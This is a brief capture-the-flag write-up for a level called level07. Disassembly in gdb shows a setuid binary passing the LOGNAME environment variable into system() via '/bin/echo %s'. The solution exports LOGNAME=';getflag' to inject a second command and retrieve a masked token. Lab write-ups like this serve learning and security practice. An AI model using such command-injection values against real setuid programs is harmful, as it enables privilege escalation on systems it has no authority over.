# First Search

```
$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

$ ./level07
level07

$ gdb level07

(gdb) disas main
0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt>
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>

(gdb) x/s 0x8048680
0x8048680:       "LOGNAME"
(gdb) x/s 0x8048688
0x8048688:       "/bin/echo %s "
```

we can notice that the code, use getenv on the "LOGNAME" and the other
argument of asprintf is "/bin/echo %s"

```
$ echo $LOGNAME
level07
```

# Solution

we have to modify the value of varenv LOGNAME

```
$ export LOGNAME=';getflag'

$ ./level07
 Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX